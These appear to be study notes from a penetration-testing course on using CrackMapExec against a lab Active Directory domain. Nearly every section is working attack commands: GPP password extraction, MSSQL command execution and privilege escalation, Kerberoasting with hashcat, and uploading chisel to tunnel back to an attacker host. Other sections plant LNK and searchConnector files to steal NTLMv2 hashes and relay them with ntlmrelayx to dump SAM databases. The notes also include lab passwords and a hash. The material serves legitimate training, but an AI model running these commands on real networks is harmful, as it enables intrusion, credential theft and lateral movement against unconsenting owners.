
# Searching for Accounts in Group Policy Objects
Searching for credentials written in the Group Policy Objects (GPO) can pay off, especially in an old environment (Windows server 2003 / 2008) since every domain user can read the GPOs.

We can use the modules `gpp_password` and `gpp_autologin`. The first module, `gpp_password`, retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences (GPP). We can read more about this attack in this blog post Finding Passwords in SYSVOL & Exploiting Group Policy Preferences, and the second module, `gpp_autologin`, searches the Domain Controller for `registry.xml` files to find autologin information and returns the username and clear text password if present.

Reference: https://adsecurity.org/?p=2288

## Password GPP
```
crackmapexec smb 10.129.203.121 -u grace -p Inlanefreight01! -M gpp_password
```

## AutoLogin GPP
```
crackmapexec smb 10.129.203.121 -u grace -p Inlanefreight01! -M gpp_autologin
```

# Working with Modules
We can run `crackmapexec <protocol> -L` to view available modules for the specified protocol.

> Note: Keep in mind that LDAP protocol communications won't work if we can't resolve the domain FQDN. If we are not connecting to the domain DNS servers, we need to configure the FQDN in the `/etc/hosts` file. Configure the **target IP to the FQDN `dc01.inlanefreight.htb`**.

## Identifying Options in Modules
To view a module's supported options, we can use the following syntax: `crackmapexec <protocol> -M <module_name> --options`

### Looking at the Source Code of the user-desc Module
The LDAP module user-desc will query all users in the Active Directory domain and retrieve their descriptions, it will only display the user's descriptions that match the default keywords, but it will save all descriptions in a file. Default keywords are not provided in the description. If we want to know what those keywords are, we need to look at the source code. We can find the source code in the directory `CrackMapExec/cme/modules/`. Then we can look for the module name and open it. In our case, the Python script that contains the module `user-desc` is `user_description.py`. Let's grep the file to find the word keywords:
```
cat CrackMapExec/cme/modules/user_description.py |grep keywords
```

- **Retrieve User Description Using user-desc Module**
```
crackmapexec ldap dc01.inlanefreight.htb -u grace -p Inlanefreight01! -M user-desc
```
```
nxc ldap dc01.inlanefreight.htb -u grace -p Inlanefreight01! -M user-desc
```
- **Opening File with All Descriptions**
```
cat /home/plaintext/.cme/logs/UserDesc-10.129.203.121-20221031_120444.log
```
- **Using a Module with Options**
```
crackmapexec ldap dc01.inlanefreight.htb -u grace -p Inlanefreight01! -M user-desc -o KEYWORDS=pwd,admin
```
### Querying User Membership
`groupmembership` is another example of a module created during this training by an HTB Academy training developer, which allows us to query the groups to which a user belongs (we will discuss how to create your own modules later). To use it, we need to specify the user we want to query with the option USER.
```
cd CrackMapExec/cme/modules/
wget https://raw.githubusercontent.com/Porchetta-Industries/CrackMapExec/7d1e0fdaaf94b706155699223f984b6f9853fae4/cme/modules/groupmembership.py -q
crackmapexec ldap dc01.inlanefreight.htb -u grace -p Inlanefreight01! -M groupmembership -o USER=julio
````

# MSSQL Enumeration and Attacks
 - **Execute SQL Queries**
```
crackmapexec mssql 10.129.203.121 -u grace -p Inlanefreight01! -q "SELECT name FROM master.dbo.sysdatabases"
```
We can also use the option `--local-auth` to specify an MSSQL user. If we don't select this option, a domain account will be used instead.
```
crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! --local-auth -q "SELECT name FROM master.dbo.sysdatabases" 
```
```
crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! --local-auth -q "SELECT table_name from core_app.INFORMATION_SCHEMA.TABLES"
```
```
crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! --local-auth -q "SELECT * from [core_app].[dbo].tbl_users"
```
- **Executing Windows Commands**
When we find an account, CrackMapExec will automatically check if the user is a DBA (Database Administrator) account or not. If we notice the output **`Pwn3d!`**, the user is a Database Administrator. Users with DBA privileges can access, modify, or delete a database object and grant rights to other users. This user can perform any action against the database.
```
crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! --local-auth -x whoami
```
- **Transfering Files via MSSQL**
MSSQL allows us to download and upload files using OPENROWSET (Transact-SQL) and Ole Automation Procedures Server Configuration Options respectively. CrackMapExec incorporates those options with `--put-file` and `--get-file`.
```

```
- **Upload File**
```
crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! --local-auth --put-file /etc/passwd C:/Users/Public/passwd
```
```
crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! --local-auth -x "dir c:\Users\Public"
```
- **Download a File from the Target Machine via MSSQL**
```
crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! --local-auth --get-file C:/Windows/System32/drivers/etc/hosts hosts
```

## SQL Privilege Escalation Module
CrackMapExec includes a couple of modules for MSSQL, one of them is `mssql_priv`, which enumerates and exploits MSSQL privileges to attempt to escalate from a standard user to a sysadmin. To achieve this, this module enumerates two (2) different privilege escalation vectors in `MSSQL EXECUTE AS LOGIN` and `db_owner role`. The module has three options `enum_privs` to list privileges (default), `privesc` to escalate privileges, and `rollback` to return the user to its original state. Let's see it in action. In the following example, the user INLANEFREIGHT\robert has the privilege to impersonate julio who is a sysadmin user.
```
crackmapexec mssql 10.129.203.121 -u robert -p Inlanefreight01! -M mssql_priv
```
```
crackmapexec mssql 10.129.203.121 -u robert -p Inlanefreight01! -M mssql_priv -o ACTION=privesc
```
```
crackmapexec mssql 10.129.203.121 -u robert -p Inlanefreight01! -M mssql_priv -o ACTION=rollback
```

> Note: To test the module with the users we have, it is necessary to try them one by one since the multi-user functionality with `--no-bruteforce` and `--continue-on-success` does not support testing a module with multiple accounts at the same time.

# Finding Kerberoastable Accounts
The Kerberoasting attack aims to harvest TGS (Ticket Granting Service) Tickets from a user with servicePrincipalName (SPN) values, typically a service account. Any valid Active Directory account can request a TGS for any SPN account. Part of the ticket is encrypted with the account's NTLM password hash, which allows us to attempt to crack the password offline.

To find the Kerberoastable accounts, we need to have a valid user in the domain, use the protocol LDAP with the option `--kerberoasting` followed by a file name, and specify the IP address of the DC as a target on CrackMapExec:

- **Kerberoasting**
```
nxc ldap dc01.inlanefreight.htb -u grace -p 'Inlanefreight01!' --kerberoasting kerberoasting.out
```
```
hashcat -m 13100 kerberoasting.out /usr/share/wordlists/rockyou.txt
```
- **Testing the Account Credentials**
```
crackmapexec smb 10.129.203.121 -u peter -p Password123
```

# Spidering and Finding Juicy Information in an SMB Share

- **Identifying if Accounts Have Access to Shared Folders**
```
crackmapexec smb 10.129.203.121 -u grace -p Inlanefreight01! --shares
```
- **Using the Spider Option to Search for Files Containing "txt"**
```
crackmapexec smb 10.129.203.121 -u grace -p Inlanefreight01! --spider IT --pattern txt
```
We can also use regular expressions with the option `--regex [REGEX]` to do more granular searches on folders, file names, or file content. In the following example, let's use `--regex .` to display any file and directory in the shared folder IT:
```
crackmapexec smb 10.129.204.177 -u grace -p Inlanefreight01! --spider IT --regex .
```
If we want to search file content, we need to enable it with the option `--content`. Let's search for a file containing the word "Encrypt."
- **Searching File Contents**
```
crackmapexec smb 10.129.204.177 -u grace -p Inlanefreight01! --spider IT --content --regex Encrypt
```
- **Retrieving a File in a Shared Folder**
```
crackmapexec smb 10.129.203.121 -u grace -p Inlanefreight01! --share IT --get-file Creds.txt Creds.txt
```
- **Sending a File to a Shared Folder**
```
crackmapexec smb 10.129.203.121 -u grace -p Inlanefreight01! --share IT --put-file /etc/passwd passwd
```
> Note: If we are transferring a large file and it fails, make sure to try again. If you keep getting an error, try adding the option `--smb-timeout` with a value greater than the default two (`2`).

### The spider_plus Module

We can use the module option EXCLUDE_DIR to prevent the tool from looking at shares like `IPC$`,`NETLOGON`,`SYSVOL`, etc.

- **Using the Module spider_plus**

```
crackmapexec smb 10.129.203.121 -u grace -p 'Inlanefreight01!' -M spider_plus -o EXCLUDE_DIR=IPC$,print$,NETLOGON,SYSVOL
```
- **Listing Files Available to the User**
```
cat /tmp/cme_spider_plus/10.129.203.121.json
```
If we want to download all the content of the share, we can use the option `READ_ONLY=false` as follow:
```
crackmapexec smb 10.129.203.121 -u grace -p Inlanefreight01! -M spider_plus -o EXCLUDE_DIR=ADMIN$,IPC$,print$,NETLOGON,SYSVOL READ_ONLY=false
```

# Proxychains with CME

![image](https://github.com/user-attachments/assets/f88f2da9-5224-47b4-bf8b-26c59c9629ab)

1. Download and Run Chisel on our Attack Host:
2. Download and Upload Chisel for Windows to the Target Host:
3. Execute chisel.exe to connect to our Chisel server using the CrackMapExec command execution option `-x` (We will discuss this option more in the Command Execution section)
4. Verify connection (port 1080)
5. We need to configure proxychains to use the Chisel default port TCP 1080. We need to make sure to include socks5 127.0.0.1 1080 in the ProxyList section of the configuration file as follows:


## Set Up the Tunnel
- **Chisel - Reverse Tunnel**
```
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz -O chisel.gz -q
gunzip -d chisel.gz
chmod +x chisel
./chisel server --reverse
```
- **Upload Chisel**
```
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_windows_amd64.gz -O chisel.exe.gz -q
gunzip -d chisel.exe.gz
crackmapexec smb 10.129.204.133 -u grace -p Inlanefreight01! --put-file ./chisel.exe \\Windows\\Temp\\chisel.exe 
```
- **Connect to the Chisel Server**
```
crackmapexec smb 10.129.204.133 -u grace -p Inlanefreight01! -x "C:\Windows\Temp\chisel.exe client 10.10.14.33:8080 R:socks"
```
- **Configure `proxychains`**
```
m3t3kh4n@htb[/htb]$ cat /etc/proxychains.conf

<SNIP>

[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5  127.0.0.1 1080
```
- **Testing CrackMapExec via Proxychains**
```
proxychains crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! --shares
```
- **Proxychains4 with Quiet Option**
```
proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! --shares
```
- **Killing Chisel on the Target Machine**
Once we have finished, we need to kill the Chisel process. To do this, we will use the option `-X` to execute PowerShell commands and run the PowerShell command `Stop-Process -Name chisel -Force`. We will discuss command execution in more detail in the Command Execution section.
```
crackmapexec smb 10.129.204.133 -u grace -p Inlanefreight01! -X "Stop-Process -Name chisel -Force"
```

## Windows as the Server and Linux as the Client
- **Starting Chisel as the Server in the Target Machine**
```
crackmapexec smb 10.129.204.133 -u grace -p Inlanefreight01! -x "C:\Windows\Temp\chisel.exe server --socks5"
```
- **Connecting to the Chisel Server from our Attack Host**
```
sudo chisel client 10.129.204.133:8080 socks
```
- **Using Proxychains to Connect to the Internal Network**
```
proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! --shares
```

# Stealing Hashes

To steal hashes using shared folders, we can create a shortcut and configure it so that the icon that appears in the shortcut points to our fake shared folder. Once the user enters the shared folder, it will try to look for the icon's location, forcing the authentication against our shared folder.

Reference: https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/

## Slinky Module

The module creates Windows shortcuts with the icon attribute containing a UNC path to the specified SMB server in all shares with write permissions. When someone visits the share, we will get their NTLMv2 hash using Responder because the icon attribute contains a UNC path to our server.

The module has two mandatory options, `SERVER` and `NAME`, and one optional `CLEANUP`.

`SERVER` corresponds to the IP of the SMB server we control and where we want the UNC path to point. The `NAME` option assigns a name to the shortcut file, and `CLEANUP` is to delete the shortcut once we finish.

## Stealing NTLMv2 Hashes

- **Finding Shares with WRITE Privileges**
```
proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! --shares
```
Therefore we can use the module Slinky to write an LNK file to each share. We will use the option SERVER=10.10.14.33, the IP address corresponding to our attack host's tun0 network, and the option NAME=important, which is the file name we are assigning to the LNK file.
- **Using Slinky**
```
proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! -M slinky -o SERVER=10.10.14.33 NAME=important
```
- **Starting Responder**
```
sudo responder -I tun0
```
> Note: The SMB option should be `On` in the `Responder.conf` file to capture the hash.

### NTLM Relay

Another solution is to relay the NTLMv2 hash directly to other servers and workstations on the network where SMB Signing is disabled. SMB Signing is essential because if a computer has SMB Signing enabled, we can't relay to that computer because we will be unable to prove our attack host's identity. To get a list of targets with SMB Signing disabled, we can use the option `--gen-relay-list`. Now we can use Proxychains and get a list of the machines with SMB Signing disabled.

- **Getting Relay List**
```
proxychains4 -q crackmapexec smb 172.16.1.0/24 --gen-relay-list relay.txt
```
We will use `ntlmrelayx` with the previous list we got from the option `--gen-relay-list`. If we find an account with local administrator privileges on the target machine, if no other options are specified, `ntlmrelayx` will automatically dump the SAM database of the target machine and we would be able to attempt to perform a pass-the-hash attack with any local admin user hashes.

- **Execute NTLMRelayX**
```
sudo proxychains4 -q ntlmrelayx.py -tf relay.txt -smb2support --no-http
```

We need to wait until a user accesses the SMB share, and our LNK file forces them to connect to our target machine (this happens in the background, and the user will not notice anything out of the ordinary). Once this is done, we should see something like this in the ntlmrelayx console:

- **Testing Local Accounts**
```
proxychains4 -q crackmapexec smb 172.16.1.5 -u administrator -H 30b3783ce2abf1af70f77d0660cf3453 --local-auth
```

- **Cleanup Everything**

When we finish with the module, cleaning up the LNK file using the option `-o CLEANUP=YES` and the name of the LNK file `NAME=important` is crucial.

```
proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! -M slinky -o NAME=important CLEANUP=YES
```

## Stealing Hashes with `drop-sc` Module

Before concluding this section, let's look at another method of forcing authentication using a file format other than `LNK`, the `.searchConnector-ms` and `.library-ms` formats. Both of these file formats have default file associations on most Windows versions. They integrate with Windows to show content from an arbitrary location which can also be a remote location, by specifying a `WebDAV` share.

In essence, they perform the same function as the LNK file. To learn more about the discovery of this method, we can read the blog post Exploring search connectors and library files in Windows.

Reference: https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/

CrackMapExec has a module named `drop-sc`, which allows us to create a `searchConnector-ms` file in a shared folder. To use it, we need to specify the option `URL` to target our SMB fake server. In this case, our host running `ntlmrelayx`. The URL needs to be escaped with double backslashes (`\`), for example: `URL=\\\\10.10.14.33\\secret`.

Optionally we can specify the following options:
- The target shared folder with the option `SHARE=name`. If we don't specify this option, it will write the file in all shares with `WRITE` permissions.
- The filename with the option `FILENAME=name`. If we don't specify this option, it will create a file named "Documents."
- The option `CLEANUP=True` if we want to clean the files we created. We need to specify the filename option if we use a custom name.

- **Dropping a searchConnector-ms File**
```
proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! -M drop-sc -o URL=\\\\10.10.14.33\\secret SHARE=IT-Tools FILENAME=secret
```
Once a user accesses the shared folder, and while we have `ntlmrelayx` listening, we should also be able to relay to the target machine.

- **Relaying Using NTLMRelayx and drop-sc**
```
sudo proxychains4 -q ntlmrelayx.py -tf relay.txt -smb2support --no-http
```
- **Cleaning Up searchConnector-ms Files**
```
proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! -M drop-sc -o CLEANUP=True FILENAME=secret
```
